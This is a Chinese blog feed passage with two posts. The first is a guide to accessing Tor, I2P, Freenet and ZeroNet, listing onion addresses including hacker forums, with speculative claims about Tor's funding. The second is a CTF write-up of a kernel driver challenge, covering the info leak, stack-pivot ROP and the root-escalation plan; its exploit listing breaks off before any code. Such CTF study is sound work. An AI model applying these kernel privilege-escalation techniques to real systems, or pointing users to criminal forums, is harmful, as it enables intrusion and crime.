    <content type="html"><![CDATA[<h1 id="步入暗网-匿名网络使用指南"><a href="#步入暗网-匿名网络使用指南" class="headerlink" title="步入暗网 - 匿名网络使用指南"></a>步入暗网 - 匿名网络使用指南</h1><p>众所周知，许多不为人知的交易都在telegram上进行，包括黄、赌、毒、间谍、黑客，甚至是军事交易。但是，2024年8月，telegram的创始人在法国被政府抓了，一个月后就宣布电报会根据法律要求为政府提供信息，暴力招安了属于是。这事一闹，telegram多半是不能用了，沦为了西方政府掌控的透明化通信软件。既然如此，来看看另一种匿名通信手段 - 暗网。本文介绍了四种匿名通信网络(Tor&#x2F;I2P&#x2F;FreeNet&#x2F;ZeroNet)的基础使用。</p><h2 id="什么是暗网"><a href="#什么是暗网" class="headerlink" title="什么是暗网"></a>什么是暗网</h2><p>深网指无法使用标准搜索引擎索引到的互联网内容，微信聊天记录、个人网盘、公司内网等都属于深网内容。</p><p>暗网是深网的子集，在无法被标准搜索引擎索引的基础上，需要使用特定的软件、配置或授权才能登陆。</p><p>暗网利用加密传输、P2P对等网络、多点中继混淆等技术为用户提供匿名的互联网信息访问。暗网中，数据包经过了多层加密转发和混淆，交易主要通过比特币，使用去中心化网络，因此难以溯源用户。</p><p>具体的技术原理这里不深究，我们只需要知道暗网是一些P2P匿名通信系统的统称，常用于避开政府进行非法网络活动。</p><p>属于暗网的匿名网络包括：Tor、I2P、freenet、zeronet等，其中Tor规模最大，知名度最高。</p><p>Tor匿名网络起源于20世纪九十年代中期美国海军研究实验室（NRL）及国防高等研究计划署（DARPA）开发的洋葱路由技术，后来该项目被非盈利组织Tor Project接管。</p><p>事实上，Tor的隐私性和安全性是存疑的：</p><ul><li>只要掌握Tor网络中一定数量的节点或监控大量的互联网流量，就能攻破Tor的匿名保护，很多政府有能力做到这一点。</li><li>Tor网络的出口节点可以获取用户的位置和身份。</li><li>Tor网络其中存在政府安排的”间谍”或钓鱼网站。</li><li>Tor虽然表面上由非盈利组织运行，事实上一直在接收美国军方和CIA的资助，很难说是否存在py交易。结合Tor的发展历史，可以猜测美政府将Tor开源独立是为了掩护其中的情报人员，使Tor流量鱼龙混杂，以免作为美军特征被识别。</li></ul><p>总的来说，Tor的志愿者节点多，规模大，浏览速度快，安全性较弱；I2P及其它匿名网络规模小、速度慢但去中心化程度更高、安全性更强。</p><p>Tor和I2P技术原理以及安全性分析：<a href="https://shef.cc/2022/12/27/%E3%80%90%E7%BD%91%E7%BB%9C%E6%89%AB%E7%9B%B2%E3%80%91tor-%E5%92%8C-i2p/">【网络扫盲】Tor 和 I2P</a>、<a href="https://www.infocomm-journal.com/cjnis/article/2019/2096-109x/2096-109x-5-1-00066.shtml">匿名网络Tor与I2P的比较研究</a></p><p>Tor网络的独立性和安全性问题：<a href="https://leagsoft.com/new-detail/290">深度揭密“洋葱路由”Tor网络</a></p><h2 id="如何访问暗网"><a href="#如何访问暗网" class="headerlink" title="如何访问暗网"></a>如何访问暗网</h2><p>国内需要VPN或网桥来访问外网 环境：VMware win10虚拟机  </p><h3 id="代理配置"><a href="#代理配置" class="headerlink" title="代理配置"></a>代理配置</h3><p>这里使用clash，开规则模式，系统代理，开启局域网连接，代理端口默认7890</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/1.png" alt="1"></p><p>虚拟机的网络配置选择使用NAT模式(仅主机模式将导致I2P无法使用)</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/2.png" alt="2"></p><p>宿主机配置VMnet8虚拟网卡的IP</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/3.png" alt="3"></p><p>在虚拟机的虚拟网络编辑器中配置VMnet8网卡，如下</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/4.png" alt="4"></p><p>虚拟机中网卡都设置为自动获取IP地址，并设置系统代理为主机VMnet8网卡IP的7890端口</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/5.png" alt="5"></p><p>配置成功后浏览器可访问<a href="http://www.google.com且虚拟机eth0网卡可以ping通宿主机vmnet8网卡/">www.google.com且虚拟机Eth0网卡可以ping通宿主机VMnet8网卡</a></p><h3 id="Tor"><a href="#Tor" class="headerlink" title="Tor"></a>Tor</h3><p><a href="https://www.torproject.org/">Tor浏览器下载地址</a></p><p>浏览器的代理配置如下，配置完点连接就可以了</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/6.png" alt="6"></p><p>Tor网站域名后缀为<code>.onion</code>。为了找到Tor网站，除了通过他人的分享，我们还可以使用专门检索Tor网站的搜索引擎。以下是几个获取Tor网址的渠道：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>DuckDuckGo,Tor浏览器默认搜索引擎，注重用户隐私，声称能搜索Tor网站,但实际上搜到的都是普通网站，不太好用<br>duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion<br><span class="hljs-regexp">//</span>Ahimia<br>https:<span class="hljs-regexp">//</span>ahmia.fi/ 搜索引擎<br>juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion<br><span class="hljs-regexp">//</span>Torch 搜索引擎<br>ifxxm4nubjdna5irh3p4uakcxuyij7w6z4yq7fpgbauihgvo7mhiemad.onion<br><span class="hljs-regexp">//</span>DEEPSEARCH 搜索引擎<br>search7tdrcvri22rieiwgi5g46qnwsesvnubqav2xakhezv4hjzkkad.onion<br><span class="hljs-regexp">//</span>Darkzone Listing 搜索引擎<br>darkobds5j7xpsncsexzwhzaotyc4sshuiby3wtxslq5jy2mhrulnzad.onion<br><span class="hljs-regexp">//</span>Hidden Wiki  导航站点/论坛，有很多电子市场、搜索引擎、邮件服务之类的推荐<br>torwikijwqskahohtn35pyfde2uqmgrxgr2fru4mn4rer5muj445dxyd.onion<br><span class="hljs-regexp">//</span>Torlinks  导航站点<br><span class="hljs-number">5</span>n4qdkw2wavc55peppyrelmb2rgsx7ohcb2tkxhub2gyfurxulfyd3id.onion<br></code></pre></td></tr></table></figure><p>几个有趣的Tor网站，当然诸如黑市、论坛、搜索引擎之类的网站还有很多</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//z-library 电子图书馆</span><br>bookszlibb74ugqojhzhg2a63w5i2atv5bqarulgczawnbmsb6s6qead<span class="hljs-selector-class">.onion</span><br><span class="hljs-comment">//Tor Amazon 电子超市</span><br>amazonuzx7moazplksr5cqzihjse2fodsm67j3d5gu3azwzswifr5yad<span class="hljs-selector-class">.onion</span><br><span class="hljs-comment">//defcon 黑客文化</span><br>g7ejphhubv5idbbu3hb3wawrs5adw7tkx7yjabnf65xtzztgg4hcsqqd<span class="hljs-selector-class">.onion</span><br><span class="hljs-comment">//Breach Forum 黑客论坛</span><br>breached26tezcofqla4adzyn22notfqwcac7gpbrleg4usehljwkgqd<span class="hljs-selector-class">.onion</span><br>breachforums<span class="hljs-selector-class">.st</span><br><span class="hljs-comment">//Onni Forums 黑客论坛</span><br>onnii6niq53gv3rvjpi7z5axkasurk2x5w5lwliep4qyeb2azagxn4qd<span class="hljs-selector-class">.onion</span><br>onniforums.com/mirrors.txt<br></code></pre></td></tr></table></figure><h3 id="I2P"><a href="#I2P" class="headerlink" title="I2P"></a>I2P</h3><p><a href="https://geti2p.net/en/">I2P官网</a></p><p>I2P在windows上提供两种安装方式:<a href="https://geti2p.net/en/download/windows">经典安装</a>和<a href="https://geti2p.net/en/download/easyinstall">简易安装</a>。两种方式都需要安装浏览器，推荐<a href="https://www.firefox.com.cn/download/#product-desktop-release">火狐浏览器</a>或Tor浏览器，经典安装需要额外安装JAVA(至少<a href="https://www.java.com/zh-CN/download/">JAVA8</a>)。</p><p>I2P程序在本地运行一个可自由配置的I2P Router，其包含了代理服务器、后台管理界面、身份验证、匹配附近端节点等功能。用户通过配置好的本地I2P代理访问I2P网络。</p><p>下面是I2P Router的两个常用端口，更多端口功能位于<code>127.0.0.1:7657/help#reachabilityhelp</code></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:7657</span> //I2P路由控制台<br><span class="hljs-number">127.0.0.1:4444</span> //HTTP代理 <br></code></pre></td></tr></table></figure><ul><li>简易安装</li></ul><p>一体化的安装包，目前还在BETA测试版本，内置了JAVA组件所以不需要手动安装JAVA。除了不用安装JAVA，其它步骤和经典安装相同。其中还包含了经典安装需要的火狐浏览器的I2P配置文件包，因此如果使用火狐浏览器，即使采用经典安装，也要先安装简易安装包。</p><ul><li>经典安装(以火狐浏览器为例)</li></ul><p>第一步：安装JAVA运行环境，Jre或Jdk都可以；安装火狐浏览器；安装简易I2P包</p><p>第二部：在官网下载并安装i2p程序</p><p>第三步：双击<code>Start I2P</code>快捷方式启动I2P Router</p><p>第四步：补种。进入web端路由控制台，在<code>127.0.0.1:7657/configreseed</code>页面进行reseed。如图，通过VPN代理(这里用clash)进行reseed成功后切换回无代理</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/7.png" alt="7"></p><p>第五步：进入<code>127.0.0.1:7657/configclients</code>开启<code>Application tunnels</code>，然后进入<code>127.0.0.1:7657/i2ptunnelmgr</code>确保I2P HTTP代理已经开启。</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/8.png" alt="8"></p><p>第六步：设置浏览器的代理为I2P HTTP代理</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/9.png" alt="9"></p><p>第七步:如果active的节点一直为0且上下行的带宽一直为0，检查防火墙。在<code>127.0.0.1:7657/confignet</code>找到UDP&#x2F;TCP端口号，在网络防火墙中将I2P程序、java程序和该端口加入白名单。注意UDP&#x2F;TCP端口每次运行是随机的，但在手动设置一次后就会固定。</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/10.png" alt="10"></p><p>第八步：在<code>日期与时间</code>的<code>Internet时间</code>中更新系统时间</p><p>第九步:找个I2P网站测试连接，比如<a href="http://wiki.i2p-projekt.i2p/">I2P-wiki</a></p><p>TIPS1:我们通过<code>127.0.0.1:7657/i2ptunnelmgr -&gt; I2P HTTP PROXY -&gt; (SSL)出口代理</code>可以访问I2P网络之外的普通网站，出口代理(Out Proxy)默认是<code>exit.stormycloud.i2p</code>，可以更换为其它更快速的代理</p><p>TIPS2:除了官网上的两种安装方式，还可以使用类似<a href="https://i2pd.readthedocs.io/en/latest/">i2pd</a>的其它I2P客户端</p><ul><li>使用</li></ul><p>第一次运行需要按照以上步骤进行安装和配置，之后只要开启I2P Router就能访问I2P网络了。I2P Router刚开启时网速非常慢，随着运行时间变长，搜集到的附近节点变多，网速会越来越快。同时每隔一段时间需要进行第四步:补种以防止种子失效。</p><p>另外，I2P还有本地地址簿功能，类似于浏览器的收藏夹，可以保存有价值的I2P网址。访问不在地址簿中的网址需要通过地址助手的跳转服务，地址助手是提供地址跳转及相关服务的I2P站点，I2P Router会在你访问时自动推荐几个地址助手。</p><p>I2P网站域名后缀为<code>.i2p</code>，其更替非常频繁。以下是几个资源站点：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//identiguy.i2p/   //活跃I2P站点跟踪</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//notbob.i2p/      //活跃I2P站点跟踪</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//tracker2.postman.i2p  //音视频、文档资源共享</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//shx5vqsw7usdaunyzr2qmes2fq37oumybpudrd4jjj4e4vk4uusa.b32.i2p/   //reg.i2p,提供域名注册、域名查询、活跃网站列表等功能</span><br></code></pre></td></tr></table></figure><h3 id="freenet"><a href="#freenet" class="headerlink" title="freenet"></a>freenet</h3><p>新版的freenet正在开发中，目前没有安装包，只有<a href="https://github.com/freenet/freenet-core">源码</a>；原始的freenet更名为Hyphanet，可以在官网下载使用。</p><p><a href="https://freenet.org/">freenet官网</a>   <a href="https://www.hyphanet.org/pages/download.html">Hyphanet官网</a> <a href="Freenet/Hyphanet_wiki">Freenet&#x2F;Hyphanet_wiki</a></p><p>与Tor不同，访问Hyphanet不需要VPN，这能防止将自己暴露给VPN代理商。Freenet在常规模式下自动连接陌生节点，如果连接到了恶意节点则可能带来风险；在高安全模式下可以添加好友节点，你只会连接并暴露给好友节点，只要好友节点绝对可信，你就是绝对隐蔽的。开启高安全模式最好添加5个以上的好友节点，否则网速很慢。</p><p>Hyphanet更新至0.75版本，0.5版本曾因存在漏洞被GFW封锁过滤，0.7版本进行了巨大更新修补了漏洞，<a href="https://github.com/hyphanet/wiki/wiki/Security-summary">Hyphanet安全摘要</a>。</p><ul><li>安装和使用Hyphanet</li></ul><p>官网下载安装包，安装后运行<code>FreenetTray.exe</code>，右下角任务栏会出现Hyphanet的图片，右键运行并<code>OPEN FREENET</code>。进入首页等几分钟就能访问了，首页有各种引导。</p><p><img src="/2024/10/13/%E6%AD%A5%E5%85%A5%E6%9A%97%E7%BD%91-%E5%8C%BF%E5%90%8D%E7%BD%91%E7%BB%9C%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/11.png" alt="11"></p><p>访问论坛和商店等都需要安装插件，将<code>USK@</code>开头的Key输入Freenet浏览器<code>Plugin Manager</code>中的<code>Add an Unofficial Plugin from Freenet </code>即可，Plugin Manager地址如下:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8888</span><span class="hljs-regexp">/plugins/</span><br></code></pre></td></tr></table></figure><h3 id="zeronet"><a href="#zeronet" class="headerlink" title="zeronet"></a>zeronet</h3><p>zeronet提供了去中心化网络以避开政府机构的监管，但匿名性(ip隐藏)的实现需要借助Tor网络的多层加密转发实现。</p><p><a href="https://zeronet.io/">zeronet官网</a>  </p><p>github地址1:<a href="https://github.com/HelloZeroNet/ZeroNet">https://github.com/HelloZeroNet/ZeroNet</a></p><p>github地址2:<a href="https://github.com/ZeroNetX/ZeroNet">https://github.com/ZeroNetX/ZeroNet</a></p><p>笔者使用github地址1和官网下载的安装包运行失败了，一直报错<code>TRACKER CONNECTION ERROR DETECT</code>。github地址2得到了更加积极的维护，笔者使用github地址2中的安装包成功访问了ZeroNet网络。</p><ul><li>安装和使用</li></ul><p>解压安装包后双击<code>ZeroNet.exe</code>即可进入<code>Hello ZeroNet</code>web界面，其中提供了几个官方站点。如果连接站点失败了，可以多等待一段时间并尝试几次，直到在左侧<code>最近下载的站点中</code>看到该站点。</p><p>zeronet客户端需要从tracker服务器获取节点，所以需要添加足够多的tracker服务器来获取最新节点。我们可以从<a href="https://github.com/ngosang/trackerslist">这里</a>获取有活跃的tracker服务器，复制<code>trackers_all</code>到<code>http://127.0.0.1:43110/Config</code>的<code>Trackers</code>中。</p><p>如果需要和Tor一起使用以实现匿名，请参考<a href="https://zeronet.readthedocs.io/en/latest/faq/#how-to-make-zeronet-work-with-tor-under-linux">ZeroNet常见问题</a></p><p>顺带一提，ZeroNet使用Bitcoin加密算法及BitTorrent网络，其站点URL中<code>http://127.0.0.1:43110/</code>后的那串字符就是区块链的钱包地址，可以向其中转入区块链货币，私钥就放在data文件下的user.json文件中。</p><p>ZeroNet社区还是挺活跃的，比freenet活跃，中文内容也很多，还带一个官方的实时聊天室，非常有趣。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>不要从非官方渠道下载用于访问暗网的软件</li><li>尽量在虚拟机中进行访问</li><li>不要透露任何可能使你暴露现实身份的信息</li><li>配合VPN使用可以加快访问速度并防止出口节点获取你的信息，但是你的IP会暴露给VPN供应商；不用VPN，而用自带的网桥也可以，但是速度会变慢</li><li>访问和搭建暗网节点在大多数国家合法，但在中国是非法的</li></ul>]]></content>
    
    
    <categories>
      
      <category>其它</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DarkNet</tag>
      
      <tag>信息搜集</tag>
      
      <tag>其它</tag>
      
      <tag>不务正业</tag>
      
      <tag>Tor</tag>
      
      <tag>I2P</tag>
      
      <tag>FreeNet</tag>
      
      <tag>ZeroNet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024长城杯-Kylin_Driver</title>
    <link href="/2024/09/11/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-Kylin-Driver/"/>
    <url>/2024/09/11/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-Kylin-Driver/</url>
    
    <content type="html"><![CDATA[<h1 id="2024长城杯-Kylin-Driver"><a href="#2024长城杯-Kylin-Driver" class="headerlink" title="2024长城杯-Kylin_Driver"></a>2024长城杯-Kylin_Driver</h1><p><img src="/2024/09/11/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-Kylin-Driver/QQ%E6%88%AA%E5%9B%BE20240910231352.png" alt="1"></p><p>题目一共三解，比赛6个小时。比赛时看到内核题就跳过了，赛后复现一波。</p><p>考点是内核ROP，KASLR、SMEP、SMAP、KPTI四项保护都开；内核基址和模块基址都给了，ROP链也没限制，所以绕过保护的思路应该挺多的。</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>给了bzImage、rootfs.cpio文件系统和qemu启动脚本。</p><p>启动脚本如下，开启了KASLR、SMEP、SMAP保护，KPTI默认开启。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>qemu-system-x86_64 \<br>    -m 256M \<br>    -kernel bzImage \<br>    -initrd rootfs_new.cpio \<br>    -monitor /dev/null \<br>    -append &quot;root=/dev/ram console=ttyS0 loglevel=8 ttyS0,115200 kaslr&quot; \<br>    -cpu kvm64,+smep,+smap \<br>    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>    -nographic \<br>    -no-reboot \<br>    -no-shutdown \<br></code></pre></td></tr></table></figure><p>解包文件系统，从<code>init</code>脚本获取内核模块路径<code>/lib/modules/5.10.0-9-generic/kernel/test.ko</code>，查看保护</p><p><img src="/2024/09/11/2024%E9%95%BF%E5%9F%8E%E6%9D%AF-Kylin-Driver/QQ%E6%88%AA%E5%9B%BE20240910004320.png" alt="2"></p><p><code>test.ko</code>拖进ida。分析init_module函数，注册了杂项设备结合注册结构体可知设备名称为test，该类设备的应用层接口位于&#x2F;dev目录，并且为该设备注册了处理函数<code>VrQsLpXwNfJrZtBpKjMvWsQpTyLnHrXs</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">init_module</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  _fentry__(a1, a2, a3);<br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)misc_register(&amp;ZpYxJfLqBrNsKzTpWvVcHrXtRmGnWlQk) )<br>  &#123;<br>    printk(&amp;unk_63D);<br>    JUMPOUT(<span class="hljs-number">0x2C3</span>LL);<br>  &#125;<br>  <span class="hljs-keyword">return</span> WnQkLxVpJrFtZcRmHsTpYfNcLwZpVxBr_cold();<br>&#125;<br></code></pre></td></tr></table></figure><p>分析<code>VrQsLpXwNfJrZtBpKjMvWsQpTyLnHrXs</code>函数</p><p>先校验用户态buffer(ioctl第三个参数)的前32位，即password。要求逐位与0xF9异或之后等于<code>gtwYHamW4U2yQ9LQzfFJSncfHgFf5Pjc</code>，然后根据操作码(ioctl第二个参数)执行不同功能。</p><p>0xDEADBEEF操作码：将驱动模块基址放进内核buffer，再将整个内核buffer与0xF9异或后拼接到用户态buffer的password后面。内核buffer没初始化，残留了内核函数地址，因此这里同时泄露了内核基址和驱动模块基址。</p><p>0xFEEDFACE操作码：将32位password后的512字节取到kernel_buffer并逐字节异或0x9F，然后将rsp指向kernel_buffer首地址进行ROP。</p><p>tips:伪c是<code>return (ssize_t)kernel_buffer;</code>，但事实上是ret到kernel_buffer中的地址。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text.unlikely:</span>000000000000027B <span class="hljs-number">48</span> <span class="hljs-number">8D</span> <span class="hljs-number">85</span> E8 FD FF FF          <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">218h</span>]<br><span class="hljs-symbol">.text.unlikely:</span><span class="hljs-number">0000000000000282</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> C4                      <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text.unlikely:</span><span class="hljs-number">0000000000000285</span> C3                            <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure><h2 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h2><ul><li>init初始化脚本中在降权命令前插入以下语句，方便查看真实符号地址和模块地址</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/m</span>odules &gt;modules.txt<br>cat <span class="hljs-regexp">/proc/</span>kallsyms &gt;kallsyms.txt<br></code></pre></td></tr></table></figure><ul><li><p>qemu启动脚本中加入<code>-gdb tcp::1234</code>，使gdb能够附加调试。</p></li><li><p>gdb调试内核时不会输出任何调试信息，使用disp指令实现每次运行后停止都输出指令、寄存器和栈信息。</p><p>编写脚本一键附加调试、下断点和输出调试信息，防止每次都要重新输一遍，用法<code>gdb -x debug_script </code>。</p><p>脚本中的<code>0xffffffffc0034000</code>是模块基址，每次重启都不同，需要查看<code>modules.txt</code>后更新为当前模块基址。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">target remote 127.0.0.1:1234<br>b *(0xffffffffc0034000  + 0x83)<br>b *(0xffffffffc0034000  + 0x1c4)<br>b *(0xffffffffc0034000  + 0x27B)<br>disp/10i <span class="hljs-variable">$rip</span><br>disp/x <span class="hljs-variable">$rax</span><br>disp/x <span class="hljs-variable">$rbx</span><br>disp/x <span class="hljs-variable">$rcx</span><br>disp/x <span class="hljs-variable">$rdx</span><br>disp/x <span class="hljs-variable">$rbp</span><br>disp/x <span class="hljs-variable">$rsp</span><br>disp/x <span class="hljs-variable">$rsi</span><br>disp/x <span class="hljs-variable">$rdi</span><br>disp/x <span class="hljs-variable">$r8</span><br>disp/x <span class="hljs-variable">$r9</span><br>disp/x <span class="hljs-variable">$r12</span><br>disp/x <span class="hljs-variable">$r13</span><br>disp/x <span class="hljs-variable">$r14</span><br>disp/x <span class="hljs-variable">$r15</span><br>disp/x <span class="hljs-variable">$rip</span><br>disp/x <span class="hljs-variable">$gs</span><br>disp/x <span class="hljs-variable">$fs</span><br>disp/x <span class="hljs-variable">$cr4</span><br>disp/20gx <span class="hljs-variable">$rsp</span>-0x10<br></code></pre></td></tr></table></figure><ul><li>exp需要编译好后打包进文件系统才能在仿真机中运行。一键编译exp并打包文件系统的脚本：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br> <br>gcc \<br>    ./exp.c \<br>    -o exp    \<br>    -masm=intel \<br>    --static  \<br>    -g<br> <br>chmod 777 ./exp<br> <br>find . | cpio -o --format=newc &gt; ./rootfs_new.cpio<br>chmod 777 ./rootfs_new.cpio<br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>思路：</p><ul><li>通过0xDEADBEEF操作码泄露内核基址和模块基址</li><li>将CR4寄存器修改为0x6f0绕过SMEP和SMAP(后来发现不需要这步)</li><li>commit_cred(prepare_kernel_cred(0))提权至root</li><li>布置要恢复的用户态寄存器值，swapgs + iretq回到用户态执行。但是由于开启KPTI，回到用户态执行时页表还是内核态，无法寻址用户态代码，触发异常导致segment fault。</li><li>signal(SIGSEGV, getshell)注册异常处理函数绕过KPTI执行用户态函数。</li></ul><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 